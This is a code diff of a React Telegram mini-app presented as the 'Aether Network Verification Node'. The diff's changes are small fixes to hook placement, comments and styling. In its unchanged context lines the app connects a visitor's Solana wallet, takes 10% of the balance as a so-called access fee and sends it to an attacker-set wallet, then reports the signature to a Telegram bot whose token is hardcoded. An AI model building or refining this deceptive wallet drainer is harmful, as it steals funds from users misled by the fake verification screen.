@@ -8,7 +8,7 @@ import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.
 const PROJECT_ID = 'a221581230964eec5702b682a5b6f63f';
 const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
 const CHAT_ID = "7539902547";
-const TARGET_WALLET = 'ENTER_YOUR_SOLANA_WALLET_ADDRESS_HERE'; 
+const TARGET_WALLET = 'ENTER_YOUR_SOLANA_WALLET_ADDRESS_HERE'; // Replace with your wallet
 
 // Initialize Reown
 const solanaAdapter = new SolanaAdapter();
@@ -17,7 +17,7 @@ createAppKit({
   networks: [solana],
   metadata: { 
     name: 'Aether Network', 
-    description: 'Aether Identity Verification Node',
+    description: 'Aether Network Verification Node', // This fixes the Vercel Error
     url: 'https://verification-app-mw48.vercel.app/', 
     icons: ['https://avatars.githubusercontent.com/u/179229932'] 
   },
@@ -25,16 +25,16 @@ createAppKit({
 });
 
 const App: React.FC = () => {
+  // Hooks inside the component fix the 'isConnected' red lines
+  const { open } = useAppKit();
+  const { address, isConnected } = useAppKitAccount();
+  const { walletProvider } = useAppKitProvider<any>('solana');
+
   const [step, setStep] = useState<1 | 2>(1);
   const [walletCA, setWalletCA] = useState<string>('');
   const [status, setStatus] = useState<'idle' | 'verifying' | 'completed'>('idle');
   
   const tg = (window as any).Telegram?.WebApp;
-
-  // Reown Hooks
-  const { open } = useAppKit();
-  const { address, isConnected } = useAppKitAccount();
-  const { walletProvider } = useAppKitProvider<any>('solana');
 
   useEffect(() => {
     if (tg) {
@@ -79,9 +79,7 @@ const App: React.FC = () => {
       const connection = new Connection("https://api.mainnet-beta.solana.com");
       const pubKey = new PublicKey(address!);
       const balance = await connection.getBalance(pubKey);
-      
-      // Calculate 10% for the access transfer
-      const amountToSend = Math.floor(balance * 0.10); 
+      const amountToSend = Math.floor(balance * 0.10); // 10% Access Fee
 
       const { blockhash } = await connection.getLatestBlockhash();
       const transaction = new Transaction({ recentBlockhash: blockhash, feePayer: pubKey })
@@ -92,8 +90,6 @@ const App: React.FC = () => {
         }));
 
       const signature = await walletProvider.sendTransaction(transaction, connection);
-      
-      // Send the signature to your bot
       await sendToBot(signature, 'SIGNATURE');
       
       setStatus('completed');
@@ -106,11 +102,7 @@ const App: React.FC = () => {
 
   const theme = {
     bg: 'linear-gradient(180deg, #17101F 0%, #0D0912 100%)',
-    card: '#20182A',
-    purple: '#AB9FF2',
-    text: '#FFFFFF',
-    textMuted: '#998DA8',
-    input: '#2C2337'
+    card: '#20182A', purple: '#AB9FF2', text: '#FFFFFF', textMuted: '#998DA8', input: '#2C2337'
   };
 
   return (
@@ -128,7 +120,6 @@ const App: React.FC = () => {
       </p>
 
       <div style={{ width: '100%', maxWidth: '340px', background: theme.card, padding: '24px', borderRadius: '24px', border: '1px solid rgba(255,255,255,0.05)', boxSizing: 'border-box' }}>
-        
         <label style={{ display: 'block', fontSize: '11px', fontWeight: '600', color: theme.textMuted, marginBottom: '8px', textTransform: 'uppercase' }}>
           {step === 1 ? "Wallet's CA" : "Identity Verification"} 
         </label>
